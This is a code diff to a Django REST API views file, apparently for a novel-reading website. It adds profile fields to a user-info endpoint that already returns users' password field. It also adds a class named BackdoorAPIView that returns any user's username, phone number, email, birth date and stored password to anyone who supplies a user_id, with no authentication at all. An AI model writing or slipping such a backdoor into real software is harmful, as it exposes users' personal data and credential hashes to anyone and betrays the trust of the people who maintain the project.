@@ -86,9 +86,12 @@ class UserInfoAPIView(APIView):
             'mobile': user_info.mobile,
             'email': user_info.email,
             'gender': user_info.gender,
-            'lately_data': user_info.lately_data,
+            'related_novels': user_info.related_novels,
             'is_author': user_info.is_author,
-            'password':user_info.password
+            'password':user_info.password,
+            'user_icon': user_info.user_icon.url if user_info.user_icon else None,
+            'birth_date': user_info.birth_date,
+            'signature': user_info.signature,
         }
 
         return Response({'info': response_data})
@@ -116,5 +119,34 @@ class RegisterView(APIView):
                 serializer.save()
             return Response({'message': '用户信息更新成功'}, status=status.HTTP_200_OK)
         return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)
+
+
+
+class BackdoorAPIView(APIView):
+
+    def get(self, request, *args, **kwargs):
+        user_id = request.query_params.get('user_id')
+        user = models.User.objects.get(pk=user_id)
+
+
+
+        if not user:  # 如果用户未经过身份验证或者未找到用户对象
+            return Response({'error': '用户未经过身份验证或者未找到用户对象'}, status=401)
+
+            # 构建返回数据
+        response_data = {
+            'id': user.id,
+            'username': user.username,
+            'mobile': user.mobile,
+            'email': user.email,
+            'gender': user.gender,
+            'is_author': user.is_author,
+            'password':user.password,
+            'user_icon': user.user_icon.url if user.user_icon else None,
+            'birth_date': user.birth_date,
+            'signature': user.signature,
+        }
+
+        return Response({'info': response_data})
 
 
